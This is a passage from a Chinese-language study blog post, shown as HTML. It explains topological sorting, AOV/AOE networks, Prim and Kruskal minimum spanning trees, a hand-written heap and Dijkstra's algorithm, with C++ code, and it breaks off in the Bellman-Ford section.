[USACO16OPEN] Closing the Farm S</a><br><a href="https://www.luogu.com.cn/problem/P1197">P1197 [JSOI2008] 星球大战 </a> 这道题有一个很好的数据结构，链式前向星来表示边，这样可以查看特定的与某个相连的顶点的所有边</p><h3 id="拓扑排序"><a class="markdownIt-Anchor" href="#拓扑排序">#</a> 拓扑排序</h3><p><strong>有向无环图</strong><br>如果有一个有向图的任意顶点都无法通过一些有向边回到自身，那么称这个有向图为有向无环图（DAG）。<br><strong>拓扑排序</strong>是指将有向无环图 G 的所有顶点排成一个线性序列，使得对图 G 中任意两个顶点 u,v，如果存在边 u-&gt;v，那么在序列中 u 一定在 v 前面。这个序列称为<strong>拓扑序列</strong>。我们可以以课程的学习先后顺序为例，例如图中所示，每门课程有其先导课程，必须先学习好其先导课程才能很好的学习这门课，并且先导课程之间不能形成环。在有了课程的联系信息之后，我们可以将课程排列成一个学习的先后序列，使得其满足先导课程顺序，这便是<strong>拓扑排序</strong>。<br>下面介绍拓扑排序的抽象步骤:</p><ul><li>①定义一个队列 Q，并把所有入度为 0 的节点加入队列。</li><li>②取队首系欸但，输出。然后删除所有从它出发的边，并令这些边到达的顶点的入度减 1，如果某个顶点的入度减为 0，则将其加入队列。</li><li>③反复进行②，直到队列为空。如果队列为空时入队的节点数目恰好为 N，则说明拓扑排序成功，图 G 为有向无环图；否则，排序失败，图 G 中有环。<br>可以使用邻接表实现拓扑排序，但是由于需要记录节点的入度，需要额外建立一个数组 inDegree [MAX_V] 来存储入度。代码如下:</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; G[MAX_V]; <span class="comment">//</span></span><br><span class="line"><span class="type">int</span> n,m,inDegree[MAX_V];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">topologicalSort</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(inDegree[i] == <span class="number">0</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; G[u].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="type">int</span> v = G[u][i];   <span class="comment">//u的后继节点v</span></span><br><span class="line">inDegree[v]--;</span><br><span class="line"><span class="keyword">if</span>(inDegree[v] == <span class="number">0</span>)&#123;</span><br><span class="line">q.<span class="built_in">push</span>(v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">G[u].<span class="built_in">clear</span>();</span><br><span class="line">num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(num == n) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其用来进行判断一个给定的图是否是有向无环图。最后指出：如果题目有要求当有多个入度为 0 的顶点时选择编号最小的顶点，那么将 qu<br>eue 改为 priority_queue，保证队首元素最小编号即可。</p><h3 id="关键路径"><a class="markdownIt-Anchor" href="#关键路径">#</a> 关键路径</h3><h4 id="aov-网和-aoe-网"><a class="markdownIt-Anchor" href="#aov-网和-aoe-网">#</a> AOV 网和 AOE 网</h4><p>顶点活动网（AOV）是指用顶点表示活动，而用边集表示活动间优先关系的有向图。显然，图中不应该出现有向环，否则会让优先关系出现逻辑错误。<br>边活动 (AOE) 网是指用带权的边集表示活动，而用顶点表示事件的有向图，其中边权表示完成活动需要的时间。<br>一般来说，AOE 网可以用来表示一个工程的进行过程，而工程常常可以分为若干个子工程，显然 AOE 网不应该出现环。考虑到对工程来说有一个起始时刻和结束时刻，因此 AOV 网一般只有一个源点和一个汇点。虽然这么说，即使有多个源点和汇点，也可以转换为一个源点和汇点的情况（即添加一个超级源点和超级汇点连接所有源点和汇点）。<br>既然 AOE 网是基于工程提出的概念，那么一定有其需要解决的问题。AOE 网需要着重解决两个问题：a. 工程起始到终止至少需要多少时间；b. 那条路径上的活动是影响整个工程进度的关键。AOE 网中最长的路径被称为<strong>关键路径</strong>，而把关键路径上的活动称为<strong>关键活动</strong>。</p><h2 id="最小生成树"><a class="markdownIt-Anchor" href="#最小生成树">#</a> 最小生成树</h2><p>再来复习一下最小生成树吧   ：）<br>【生成树定义】给定一个无向图，如果它的某一个子图中任意两个顶点都相互连通并且是一棵树，那莪这棵树就叫做生成树。如果边上有权值，那么使得边权和最小的生成树是最小生成树。<br>【应用例题】：<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(3).png?raw=true" alt="例题示例"></p><h4 id="算法1prim算法"><a class="markdownIt-Anchor" href="#算法1prim算法">#</a> 算法 1（Prim 算法）</h4><p>首先，我们假设有一颗只包含一个点 v 的树 T。然后贪心选取 T 和其他顶点之间相连的最小权值的边，并把它加到 T 中。不断进行这个操作，即可获得一个生成树。下面来证明：<br>我们令 V 表示顶的集合。假设现在已经求得的生成树的顶点的集合是 X（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊂</mo></mrow><annotation encoding="application/x-tex">\subset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊂</span></span></span></span> V）, 并且存在在 V 上的最小生成树使得 T 是它的一个子图。下面我们证明存在一棵最小生成树使得 T 是它的一个子图并且它包含了连接 X 和 V\X 的权值最小的边。记连接 X 和 V\X 的权值最小的边为 e，它连接着 V（∈X）和 u (∈V \ X)。 根据假设，存在一颗 V 上的最小生成树使得 T 是它的一个子图。如果 e 也在这棵最小生成树上，问题就得到证明了，所以我们假设 e 不再这棵书上。因为生成树的本质是一棵树，所以在添加了 e 之后就形成了圈。<br>算了，抄别人的证明太难受了，我说一下自己的想法吧，虽然可能很潦草还有错误但是能理解就行：就是一个无向图，那我们随机取一个点，找这个点所能连的最小的边（为什么能随机取，因为任意一个点所连的最小边一定要取，满足贪心），如果选的最小边会使生成树产生环，则取次小边，直到所有点都被取到。<br>那直接根据我的定义上代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> cost[MAX_V][MAX_V]; <span class="comment">//表示 e=(u,v)的权值，不存在的情况下为INF</span></span><br><span class="line"><span class="type">int</span> mincost[MAX_V];     <span class="comment">//从集合X 出发的边到每个顶点的最小权值</span></span><br><span class="line"><span class="type">bool</span> used[MAX_V];       <span class="comment">//顶点i是否被包含在集合X中</span></span><br><span class="line"><span class="type">int</span> V; <span class="comment">//顶点数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; V; i++)&#123;</span><br><span class="line">mincost[i] = INF;</span><br><span class="line">used[i] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">mincost[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//由于随机取都行 这里直接拿第一个</span></span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="type">int</span> v = <span class="number">-1</span>; <span class="comment">//从不属于X的顶点选取从x到其权值最小的顶点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>; u &lt; V; u++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[u]&amp;&amp;(v == <span class="number">-1</span> || mincost[u] &lt; mincost[v])) v = u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(v == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">used[v] = <span class="literal">true</span>;</span><br><span class="line">res += mincost[v];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>;u &lt;V; u++)&#123;</span><br><span class="line">mincost[u] = <span class="built_in">min</span>(mincost[u], cost[v][u]);  <span class="comment">//更新集合X 出发到每个边的最小权值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="算法2kruskal算法"><a class="markdownIt-Anchor" href="#算法2kruskal算法">#</a> 算法 2（Kruskal 算法）</h4><p>下面是 Kruskal 算法。其是按照边的权值进行排序从小到大，如果不产生圈，就加上这条边。主要就是如何判断加的边是否形成圈（这里似乎可以用并查集的方法–&gt; 如果两个要连接的点属于同一根 则会形成圈 不属于同一根 则可以链接） Kruskal 在边排序较为费时间（边太多可以用 Prim 算法）<br>下面上代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span>&#123;<span class="type">int</span> u,v,cost;&#125;;</span><br><span class="line"><span class="type">int</span> par[MAX_V],rank[MAX_V];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_union_find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;V;i++)&#123;</span><br><span class="line">par[i] = i;</span><br><span class="line">rank[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(par[x] == x) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> par[x] = <span class="built_in">find</span>(par[x]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unite</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">x = <span class="built_in">find</span>(x);</span><br><span class="line">y = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(x == y) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt; rank[y])&#123;</span><br><span class="line">par[x] = y;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">par[y] = x;</span><br><span class="line"><span class="keyword">if</span> (rank[x] == rank[y]) rank[x]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">same</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(x) == <span class="built_in">find</span>(y) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> edge&amp; e1,<span class="type">const</span> edge&amp; e2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> e1.cost &lt; e2.cost;</span><br><span class="line">&#125;</span><br><span class="line">edge es[MAX_E];</span><br><span class="line"><span class="type">int</span> V,E; <span class="comment">//V 定点数 E 边数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">sort</span>( es, es+ E, cmp);</span><br><span class="line"><span class="built_in">init_union_find</span>(V);</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; E; i++)&#123;</span><br><span class="line">edge e = es[i];</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">same</span>(e.u,e.v))&#123;</span><br><span class="line">res += e.cost;</span><br><span class="line"><span class="built_in">unite</span>(e.u,e.v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆"><a class="markdownIt-Anchor" href="#堆">#</a> 堆</h2><p>【定义】 堆是一棵<strong>完全二叉树</strong>，树种每个结点的值都不小于（或不大于）其左右孩子结点的值。堆其实可以用 STL 库中的优先队列 (priority_queue) 代替。这里给出堆的手打模板。数组实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> heap[MAX_N],sz=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i =sz++;    <span class="comment">//自己的节点编号</span></span><br><span class="line"><span class="keyword">while</span>(i &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> p = (i<span class="number">-1</span>) / <span class="number">2</span>;   <span class="comment">//父亲的节点编号</span></span><br><span class="line"><span class="keyword">if</span>(heap[p] &lt;= x) <span class="keyword">break</span>;   <span class="comment">//如果没有大小颠倒 退出</span></span><br><span class="line">heap[i] = heap[p];     <span class="comment">//把父亲节点的数值放下去，把自己提上去</span></span><br><span class="line">i = p;</span><br><span class="line">&#125;</span><br><span class="line">heap[i] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ret = heap[<span class="number">0</span>];   <span class="comment">//最小值</span></span><br><span class="line"><span class="type">int</span> x = heap[sz--];  <span class="comment">//要提到根的数值</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>; <span class="comment">//从根开始向下交换</span></span><br><span class="line"><span class="keyword">while</span>(i * <span class="number">2</span> + <span class="number">1</span> &lt;sz)&#123;</span><br><span class="line"><span class="comment">//比较儿子的值</span></span><br><span class="line"><span class="type">int</span> a = i * <span class="number">2</span> + <span class="number">1</span>, b = i * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(b &lt; sz &amp;&amp; heap[b] &lt; heap[a]) a=b;</span><br><span class="line"><span class="comment">//如果已经没有大小颠倒则退出</span></span><br><span class="line"><span class="keyword">if</span>(heap[a] &gt;= x) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//把儿子的数值提上取去</span></span><br><span class="line">heap[i] = heap[a];</span><br><span class="line">i = a;</span><br><span class="line">&#125;</span><br><span class="line">heap[i] = x;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最短路径算法"><a class="markdownIt-Anchor" href="#最短路径算法">#</a> 最短路径算法</h2><p>最短路径是图论中一个很经典的问题：给定图 G (V,E)，求一条从起点到终点的路径，使得这条路径上经过的所有边权和最小。即<strong>对任意给出的图 G (V,E) 和起点 S，终点 T，求 S 到 T 的最短路径。</strong> 常用的有 Dijkstra 算法，Bellman-Ford 算法，SPFA 算法，Floyd 算法。</p><h4 id="dijkstra算法"><a class="markdownIt-Anchor" href="#dijkstra算法">#</a> Dijkstra 算法</h4><p>其可以用来求解<strong>单源最短路问题</strong>，即给定图 G 和起点 s，可以得到 S 到达每个顶点的最短距离。Dijkstra 的基本思想是对图 G (V,E) 设置集合 S，存放已被访问的顶点，然后每次从集合 V-S 中选择与起点 s 的最短距离最小的一个顶点（记为 u），访问并加入集合 S。之后，令顶点 u 为中介点，优化从 s 与所有从 u 能到达的顶点 v 之间的最短距离。这样的操作执行 n 次，（n 为顶点个数）直到集合 S 已经包含所有的顶点。<br>其算法策略是：<br>①每次从集合 V-S (未到达的节点) 中选择与起点 s 最短距离最小的顶点 u，访问并加入 S。<br>②之后，令顶点 u 为中介点，优化起点 s 和所有从 u 能到达的顶点 v 之间的最短距离。<br>下面给出伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//G为图，一般设成全局变量；数组d为源点到达各个点的最短路径长度，s为起点</span><br><span class="line">Dijkstra (G,d[],s)&#123;</span><br><span class="line">初始化</span><br><span class="line">for(循环n)&#123;</span><br><span class="line">u = 使d[u]最小的还未被访问的顶点的编号</span><br><span class="line">for(从u出发能到达的所有顶点v)&#123;</span><br><span class="line">if(v未被访问&amp;&amp;以u为中介点使s到顶点v的最短距离d[v]更优)&#123;</span><br><span class="line">优化d[v];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<s>只实现邻接表版本</s>的，邻接矩阵内核都是与上述伪代码一样。算了还是写临界矩阵的把<br><strong>邻接矩阵版本：(这里加上了前驱节点可以获得最短路径)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n,G[MAX_V][MAX_V];  <span class="comment">//n为顶点数，MAX_V为最大顶点数</span></span><br><span class="line"><span class="type">int</span> d[MAX_V]; <span class="comment">//起点到达各个点的最短路径长度</span></span><br><span class="line"><span class="type">int</span> pre[MAX_V];  <span class="comment">//pre[v] 表示从起点到顶点v的最短路径上v的前一个顶点</span></span><br><span class="line"><span class="type">bool</span> vis[MAX_V] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="built_in">fill</span>(d, d+MAX_V, INF);</span><br><span class="line">d[s] = <span class="number">0</span>;  <span class="comment">//起点s到自身的距离是0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="type">int</span> u = <span class="number">-1</span>,MIN = INF;   <span class="comment">//u使d[u]最小，MIN存放该最小的d[u]</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;   <span class="comment">// 找到未被访问的顶点d[]中最小的</span></span><br><span class="line"><span class="keyword">if</span>(vis[j] == <span class="literal">false</span> &amp;&amp; d[j] &lt; MIN)&#123;</span><br><span class="line">u = j;</span><br><span class="line">MIN = d[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//找不到小于INF 的 d[u],说明剩下的顶点和起点s不连通</span></span><br><span class="line"><span class="keyword">if</span>( u == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">vis[u] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = <span class="number">0</span>; v&lt; n; v++)&#123;<span class="comment">//如果v未访问&amp;&amp; u能到达v &amp;&amp;以u为中介点可以使d[v]更优</span></span><br><span class="line"><span class="keyword">if</span>(vis[v] == <span class="literal">false</span> &amp;&amp; G[u][v] != INF &amp;&amp; d[u] + G[u][v] &lt; d[v])&#123;</span><br><span class="line">d[v] = d[u] + G[u][v];</span><br><span class="line">pre[v] = u;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> v)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(v == s)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">DFS</span>(s,pre[v]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>邻接表版本：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//邻接表版本</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line"><span class="type">int</span> v,dis;   <span class="comment">//v为边的目标顶点，dis为边权</span></span><br><span class="line">&#125;</span><br><span class="line">vector&lt;Node&gt; Adj[MAX_V];  <span class="comment">//图G，存放从顶点u触发可以到达的所有顶点</span></span><br><span class="line"><span class="type">int</span> n;<span class="comment">//n为定点数</span></span><br><span class="line"><span class="type">int</span> d[MAX_V];<span class="comment">//起点到达各个点的最短路径长度</span></span><br><span class="line"><span class="type">bool</span> vis[MAXV] = &#123;<span class="literal">false</span>&#125;;  <span class="comment">//标记数组，true表示已经被访问过</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="built_in">fill</span>(d,d+MAX_V,INF);   <span class="comment">//fill函数讲d数组赋值为INF （慎用memset)</span></span><br><span class="line">d[s] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i= <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="type">int</span> u = <span class="number">-1</span>, MIN = INF;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j&lt; n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(vis[j] == <span class="literal">false</span> &amp;&amp; d[j] &lt; MIN)&#123;</span><br><span class="line">u = j;</span><br><span class="line">MIN = d[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//找不到小于INF的d[u],说明剩下的顶点和起点s不连通</span></span><br><span class="line"><span class="keyword">if</span>(u == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">vis[u] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; Adj[u].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="type">int</span> v = Adj[u][j].v;</span><br><span class="line"><span class="keyword">if</span>(vis[v] == <span class="literal">false</span> &amp;&amp; d[u] + Adj[u][j].dis &lt; d[v])&#123;</span><br><span class="line">d[v] = d[u] + Adj[u][j].dis; <span class="comment">//优化d[v]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是双向边，只需要添加两次邻接表即可。</p><h5 id="dijkstra扩展"><a class="markdownIt-Anchor" href="#dijkstra扩展">#</a> Dijkstra 扩展</h5><blockquote><p>先鸽一下</p></blockquote><p>这里做了一道洛谷上的<a href="https://www.luogu.com.cn/problem/P1629"> P1629 邮递员送信 </a>这道题有个很好的思路，对于起点到多个点的最短路径，如果求多个点到起点的最短路径，可以 Dijkstra 但是反向建图求 Dij。我觉得这个思路特别好。另外本题似乎要判断重边取最小，否则直接爆零。<s>太惨了</s></p><p>扩展 2，洛谷的<a href="https://www.luogu.com.cn/problem/P6833"> P6833 雷雨 -</a>, 这个题也是可以用 Dij 做，这里有一个很好的思路，但是感觉适应这个思路的地方比较少，具体可以点进去看之前的代码。</p><h4 id="bellman-ford算法和spfa算法"><a class="markdownIt-Anchor" href="#bellman-ford算法和spfa算法">#</a> Bellman-Ford 算法和 SPFA 算法</h4><p>Dijkstra 算法可以很好解决无负权图的最短路径问题，但是如果出现了负权边，Dijkstra 算法就会失效。<br>Bellman-Ford 算法和 Dijkstra 算法一样，是用来求解<strong>单源最短路径</strong>问题，但是也能处理带有负权边的情况。现在考虑<strong>环</strong>，也就是从某个顶点出发，经过若干个不同顶点回到该顶点的情况。而根据环中边的边权之和的正负，可以将环分为<strong>零环，正环，负环</strong>。显然，零环和正环不会影响最短路径的求解，如果出现负环，且从源点可以到达，那么就会影响最短路径的求解。<br>与 Dijkstra 算法相同，<strong>Bellman-Ford</strong> 算法设置一个数组 d，用来存放源点到达各个顶点的最短距离。同时 Bellman-Ford 算法返回一个 bool 值：如果其中存在从源点可以到达的负环，那么函数将会返回 false，否则，函数将返回 true，此时数组当中存放的就是从源点到达各个顶点的最短路径。<br>Bellman-Ford 算法的主要思路如下面的伪代码所示。需要对图中的边进行 V-1 轮操作，每轮都遍历图中的所有边：对每条边 u-&gt;v，如果以 u 为中介点可以使 d [v] 更小，即 d [u]+length [u0&gt;v] &lt; d [v] 成立时，就用 d [u]+length [u-&gt;v] 更新 d [v]。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 